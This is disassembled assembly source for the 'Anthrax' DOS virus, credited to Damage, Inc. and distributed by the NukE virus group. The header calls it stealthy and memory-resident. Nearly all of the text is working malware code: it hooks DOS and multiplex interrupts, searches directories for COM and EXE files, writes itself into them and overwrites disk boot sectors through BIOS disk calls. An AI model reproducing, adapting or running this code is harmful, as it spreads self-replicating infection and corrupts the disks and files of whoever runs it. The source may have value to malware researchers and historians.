;**************************************************************************
;**                        ANTHRAX VIRUS                                 **
;**      Created: 2 Jan 90           Programmer: (c) Damage, Inc.        **
;** [NukE] Notes: Another Stealth Type of Virus! and this one is Detected**
;**               by Scan (McAfee & Assc.) And does copy itself to *.COM **
;**               *.EXE and the Command.Com and is Memory Resident!      **
;**                                                                      **
;** Sources brought to you by -> Rock Steady [NukE]s Head Programmer!    **
;**                                                                      **
;**************************************************************************

.286p

DATA_1E		EQU	46CH			; (0000:046C=2DH)
DATA_2E		EQU	4			; (65AC:0004=0)
DATA_3E		EQU	7			; (65AC:0007=0)
DATA_10E	EQU	5FEH			; (65AC:05FE=0)

SEG_A		SEGMENT	BYTE PUBLIC
		ASSUME	CS:SEG_A, DS:SEG_A


		ORG	100h

ANTHRAX		PROC	FAR

START:
		JMP	LOC_24			; (043B)
		DB	13 DUP (0)
		DB	95H, 8CH, 0C8H, 2DH, 0, 0
		DB	0BAH, 0, 0, 50H, 52H, 1EH
		DB	33H, 0C9H, 8EH, 0D9H, 0BEH, 4CH
		DB	0, 0B8H, 0CDH, 0, 8CH, 0CAH
		DB	87H, 44H, 44H, 87H, 54H, 46H
		DB	52H, 50H, 0C4H, 1CH, 0B4H, 13H
		DB	0CDH, 2FH, 6, 53H, 0B4H, 13H
		DB	0CDH, 2FH, 58H, 5AH, 87H, 4
		DB	87H, 54H, 2, 52H, 50H, 51H
		DB	56H, 0A0H, 3FH, 4, 0A8H, 0FH
		DB	75H, 6CH, 0EH, 7, 0BAH, 80H
		DB	0, 0B1H, 3, 0BBH, 77H, 6
		DB	0B8H, 1, 2, 50H, 0CDH, 13H
		DB	58H, 0B1H, 1, 0BBH, 0, 4
		DB	0CDH, 13H, 0EH, 1FH, 0BEH, 9BH
		DB	3, 8BH, 0FBH, 0B9H, 5EH, 0
		DB	56H, 0F3H, 0A6H, 5EH, 8BH, 0FBH
		DB	0B9H, 62H, 0, 56H, 0F3H, 0A4H
		DB	5FH, 0BEH, 12H, 8, 0B9H, 65H
		DB	0, 0F3H, 0A4H, 74H, 1EH, 89H
		DB	4DH, 0E9H, 0B1H, 5CH, 89H, 4DH
		DB	9BH, 88H, 6DH, 0DCH, 0B1H, 2
		DB	33H, 0DBH, 0B8H, 2, 3, 0CDH
		DB	13H, 49H, 0BBH, 0, 4, 0B8H
		DB	1, 3, 0CDH, 13H, 49H, 0B4H
		DB	19H, 0CDH, 21H, 50H, 0B2H, 2
		DB	0B4H, 0EH, 0CDH, 21H, 0B7H, 2
		DB	0E8H, 87H, 1, 5AH, 0B4H, 0EH
		DB	0CDH, 21H, 5EH, 1FH, 8FH, 4
		DB	8FH, 44H, 2, 8FH, 44H, 44H
		DB	8FH, 44H, 46H, 1FH, 1EH, 7
		DB	95H, 0CBH
copyright	DB	'(c) Damage, Inc.'
		DB	0, 0B0H, 3, 0CFH, 6, 1EH
		DB	57H, 56H, 50H, 33H, 0C0H, 8EH
		DB	0D8H, 0BEH, 86H, 0, 0EH, 7
		DB	0BFH, 8, 6, 0FDH, 0ADH, 0ABH
		DB	0A5H, 0AFH, 87H, 0F7H, 0ADH, 0FCH
		DB	74H, 11H, 1EH, 7, 0AFH, 0B8H
		DB	7, 1, 0ABH, 8CH, 0C8H, 0ABH
		DB	8EH, 0D8H, 0BFH, 68H, 0, 0A5H
		DB	0A5H, 58H, 5EH, 5FH, 1FH, 7
		DB	2EH, 0FFH, 2EH, 0, 6, 6
		DB	1EH, 57H, 56H, 52H, 51H, 53H
		DB	50H, 0EH, 1FH, 0BEH, 6, 6
		DB	33H, 0C9H, 8EH, 0C1H, 0BFH, 84H
		DB	0, 0A5H, 0A5H, 0B4H, 52H, 0CDH
		DB	21H, 26H, 8BH, 47H, 0FEH, 8EH
		DB	0D8H, 0BBH, 3, 0, 3, 7
		DB	40H, 8EH, 0D8H, 81H, 7, 80H
		DB	0, 0EH, 7, 0B7H, 12H, 0E8H
		DB	0F2H, 0, 58H, 5BH, 59H, 5AH
		DB	5EH, 5FH, 1FH, 7, 2EH, 0FFH
		DB	2EH, 6, 6
  
LOC_RET_1:
		RETN
		DB	91H, 0AEH, 0B4H, 0A8H, 0BFH
		DB	20H, 31H, 39H, 39H, 30H
  
ANTHRAX		ENDP
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
SUB_1		PROC	NEAR
		MOV	AX,3D00H
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		JC	LOC_RET_1		; Jump if carry Set
		XCHG	AX,BX
		MOV	AX,1220H
		INT	2FH			; Multiplex/Spooler al=func 20h
		PUSH	BX
		MOV	BL,ES:[DI]
		MOV	AX,1216H
		INT	2FH			; Multiplex/Spooler al=func 16h
		POP	BX
		MOV	SI,462H
		MOV	DX,SI
		MOV	CL,18H
		MOV	AH,3FH			; '?'
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		XOR	AX,CX
		JNZ	LOC_7			; Jump if not zero
		PUSH	ES
		POP	DS
		MOV	BYTE PTR [DI+2],2
		XOR	DX,DX			; Zero register
LOC_2:
		IN	AL,DX			; port 0, DMA-1 bas&add ch 0
		CMP	AL,10H
		JB	LOC_2			; Jump if below
		ADD	AX,[DI+11H]
		ADC	DX,[DI+13H]
		AND	AL,0F0H
		CMP	AX,0FB00H
		JAE	LOC_7			; Jump if above or =
		MOV	[DI+15H],AX
		MOV	[DI+17H],DX
		PUSH	CS
		POP	DS
		PUSH	AX
		MOV	CL,10H
		DIV	CX			; ax,dx rem=dx:ax/reg
		SUB	AX,[SI+8]
		MOV	CX,AX
		SUB	AX,[SI+16H]
		MOV	DS:DATA_2E,AX		; (65AC:0004=0)
		LODSW				; String [si] to ax
		XOR	AX,5A4DH
		JZ	LOC_3			; Jump if zero
		XOR	AX,1717H
LOC_3:
		PUSHF				; Push flags
		JNZ	LOC_4			; Jump if not zero
		MOV	[SI],AX
		CMP	AX,[SI+0AH]
		XCHG	AX,[SI+12H]
		MOV	DS:DATA_3E,AX		; (65AC:0007=0)
		MOV	[SI+14H],CX
		MOV	CX,4DCH
		JZ	LOC_5			; Jump if zero
		ADD	WORD PTR [SI+8],48H
LOC_4:
		MOV	CX,65H
LOC_5:
		PUSH	CX
		MOV	CX,39BH
		MOV	AH,40H			; '@'
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		XOR	CX,AX
		POP	CX
		JNZ	LOC_6			; Jump if not zero
		MOV	DX,400H
		MOV	AH,40H			; '@'
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		XOR	CX,AX
LOC_6:
		POP	DX
		POP	AX
LOC_7:
		JNZ	LOC_11			; Jump if not zero
		MOV	ES:[DI+15H],CX
		MOV	ES:[DI+17H],CX
		PUSH	DX
		POPF				; Pop flags
		JNZ	LOC_9			; Jump if not zero
		MOV	AX,ES:[DI+11H]
		MOV	DX,ES:[DI+13H]
		MOV	CH,2
		DIV	CX			; ax,dx rem=dx:ax/reg
		TEST	DX,DX
		JZ	LOC_8			; Jump if zero
		INC	AX
LOC_8:
		MOV	[SI],DX
		MOV	[SI+2],AX
		JMP	SHORT LOC_10		; (0328)
LOC_9:
		MOV	BYTE PTR [SI-2],0E9H
		ADD	AX,328H
		MOV	[SI-1],AX
LOC_10:
		MOV	CX,18H
		LEA	DX,[SI-2]		; Load effective addr
		MOV	AH,40H			; '@'
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
LOC_11:
		OR	BYTE PTR ES:[DI+6],40H	; '@'
		MOV	AH,3EH			; '>'
LOC_12:
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		RETN
SUB_1		ENDP
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
SUB_2		PROC	NEAR
		MOV	DS,CX
		MOV	BL,DS:DATA_1E		; (0000:046C=34H)
		PUSH	CS
		POP	DS
		INC	DATA_7			; (65AC:045E=0FC00H)
		MOV	DX,64BH
		CALL	SUB_3			; (036D)
		MOV	SI,60AH
		MOV	BYTE PTR [SI],5CH	; '\'
		INC	SI
		XOR	DL,DL			; Zero register
		MOV	AH,47H			; 'G'
		INT	21H			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
		MOV	DX,39BH
LOC_13:
		MOV	AH,3BH			; ';'
		INT	21H			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		JCXZ	LOC_14			; Jump if cx=0
		MOV	AH,51H			; 'Q'
		INT	21H			; DOS Services  ah=function 51h
						;  get active PSP segment in bx
		MOV	DS,BX
		MOV	DX,80H
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
SUB_3:
		MOV	AH,1AH
		JMP	SHORT LOC_12		; (0339)
LOC_14:
		JC	LOC_17			; Jump if carry Set
		MOV	SI,39CH
		XOR	DL,DL			; Zero register
		MOV	AH,47H			; 'G'
		INT	21H			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
		CMP	CH,BYTE PTR DS:[3DCH]	; (65AC:03DC=81H)
LOC_15:
		MOV	CL,32H			; '2'
		MOV	DX,29DH
		MOV	AH,4EH			; 'N'
		JZ	LOC_20			; Jump if zero
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_17			; Jump if carry Set
LOC_16:
		MOV	DX,64BH
		MOV	AX,4F01H
		MOV	SI,3DCH
		MOV	DI,668H
		STOSB				; Store al to es:[di]
		MOV	CL,0DH
		REPE	CMPSB			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		JZ	LOC_20			; Jump if zero
		CMP	CH,[DI-2]
		JE	LOC_20			; Jump if equal
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JNC	LOC_16			; Jump if carry=0
		XOR	AL,AL			; Zero register
		JMP	SHORT LOC_15		; (0380)
		DB	2AH, 2EH, 2AH, 0
LOC_17:
		MOV	CL,41H			; 'A'
		MOV	DI,39CH
		CMP	CH,[DI]
		MOV	AL,CH
		MOV	BYTE PTR DS:[3DCH],AL	; (65AC:03DC=81H)
		JZ	LOC_23			; Jump if zero
		REPNE	SCASB			; Rep zf=0+cx >0 Scan es:[di] for al
		DEC	DI
		MOV	CL,41H			; 'A'
		MOV	AL,5CH			; '\'
		STD				; Set direction flag
		REPNE	SCASB			; Rep zf=0+cx >0 Scan es:[di] for al
		LEA	SI,[DI+2]		; Load effective addr
		MOV	DI,3DCH
		CLD				; Clear direction
LOC_18:
		LODSB				; String [si] to al
		TEST	AL,AL
		STOSB				; Store al to es:[di]
		JNZ	LOC_18			; Jump if not zero
		MOV	DX,2CDH
		XOR	CL,CL			; Zero register
		JMP	SHORT LOC_13		; (035E)
		DB	2EH, 2EH, 0
LOC_19:
		MOV	DX,64BH
		MOV	AH,4FH			; 'O'
LOC_20:
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_17			; Jump if carry Set
DATA_6		DW	69BEH
		DB	6, 0BFH, 0DCH, 3, 80H, 3CH
		DB	2EH, 74H, 0ECH, 88H, 2DH, 8BH
		DB	0D6H, 0F6H, 44H, 0F7H, 10H, 75H
		DB	0DBH
LOC_21:
		LODSB				; String [si] to al
		TEST	AL,AL
		STOSB				; Store al to es:[di]
		JNZ	LOC_21			; Jump if not zero
		DEC	SI
		STD				; Set direction flag
		LODSW				; String [si] to ax
		LODSW				; String [si] to ax
		CLD				; Clear direction
		CMP	AX,4558H
		JE	LOC_22			; Jump if equal
		CMP	AX,4D4FH
		JNE	LOC_19			; Jump if not equal
LOC_22:
		PUSH	BX
		CALL	SUB_1			; (0262)
		POP	BX
		XOR	CX,CX			; Zero register
		MOV	ES,CX
		MOV	AL,ES:DATA_1E		; (0000:046C=38H)
		PUSH	CS
		POP	ES
		SUB	AL,BL
		CMP	AL,BH
		JB	LOC_19			; Jump if below
LOC_23:
		MOV	DX,80H
		MOV	CL,3
		MOV	BX,200H
		MOV	AX,301H
		INT	13H			; Disk  dl=drive 0: ah=func 03h
						;  write sectors from mem es:bx
		MOV	DX,60AH
		JMP	LOC_13			; (035E)
SUB_2		ENDP
  
LOC_24:
		XCHG	AX,BP
		MOV	DI,100H
		MOV	BX,[DI+1]
		SUB	BX,228H
		MOV	AX,DI
		LEA	SI,[BX+3FDH]		; Load effective addr
		MOVSW				; Mov [si] to es:[di]
		MOVSB				; Mov [si] to es:[di]
		XCHG	AX,BX
		MOV	CL,4
		SHR	AX,CL			; Shift w/zeros fill
		MOV	CX,DS
		ADD	AX,CX
		MOV	DX,0BH
		JMP	SHORT LOC_26		; (04CD)
		DB	0B8H, 0D0H
DATA_7		DW	0FC00H
DATA_8		DW	8587H
		DB	68H, 0FAH, 0ABH, 8CH, 0C8H, 0E2H
		DB	0F7H, 0A3H, 86H, 0, 0ABH, 8EH
		DB	0D8H, 0B4H, 8, 0CDH, 13H, 49H
		DB	49H, 0A1H, 0E9H, 3, 84H, 0E4H
		DB	74H, 1, 91H, 0B2H, 80H, 0B8H
		DB	3, 3, 0CDH, 13H, 91H, 84H
		DB	0E4H, 75H, 2
		DB	2CH, 40H
LOC_25:
		DEC	AH
		MOV	DATA_6,AX		; (65AC:03E9=69BEH)
		INC	DATA_8			; (65AC:0460=8587H)
		XOR	DH,DH			; Zero register
		MOV	CX,1
		MOV	BX,400H
		MOV	AX,301H
		INT	13H			; Disk  dl=drive ?: ah=func 03h
						;  write sectors from mem es:bx
		MOV	DL,DH
		RETF				; Return far
		DB	41H, 4EH, 54H, 48H, 52H, 41H
		DB	58H, 0EH, 1FH, 83H, 2EH, 13H
		DB	4, 2, 0CDH, 12H, 0B1H, 6
		DB	0D3H, 0E0H, 8EH, 0C0H, 0BFH, 0
		DB	4, 0BEH, 0, 7CH, 0B9H, 0
		DB	1, 8BH, 0DEH, 0FCH, 0F3H, 0A5H
		DB	8EH, 0D8H, 0BAH, 27H, 4
LOC_26:
		PUSH	CX
		PUSH	BX
		PUSH	AX
		PUSH	DX
		RETF				; Return far
		DB	8EH, 0C1H, 0B1H, 4, 0BEH, 0B0H
		DB	5
  
LOCLOOP_27:
		ADD	SI,0EH
		LODSW				; String [si] to ax
		CMP	AL,80H
		JE	LOC_29			; Jump if equal
		LOOP	LOCLOOP_27		; Loop if cx > 0

LOC_28:
		INT	18H			; ROM basic
LOC_29:
		XCHG	AX,DX
		STD				; Set direction flag
		LODSW				; String [si] to ax
		XCHG	AX,CX
		MOV	AX,201H
		INT	13H			; Disk  dl=drive a: ah=func 02h
						;  read sectors to memory es:bx
		CMP	WORD PTR DS:DATA_10E,0AA55H	; (65AC:05FE=0)
		JNE	LOC_28			; Jump if not equal
		PUSH	ES
		PUSH	DS
		POP	ES
		POP	DS
		XOR	DH,DH			; Zero register
		MOV	CX,2
		XOR	BX,BX			; Zero register
		MOV	AX,202H
		INT	13H			; Disk  dl=drive a: ah=func 02h
						;  read sectors to memory es:bx
		JMP	$-10FH
		DB	0, 0, 0, 0, 0CDH, 20H
		DB	0CCH
		DB	112 DUP (1AH)
  
SEG_A		ENDS
  
  
  
		END	START
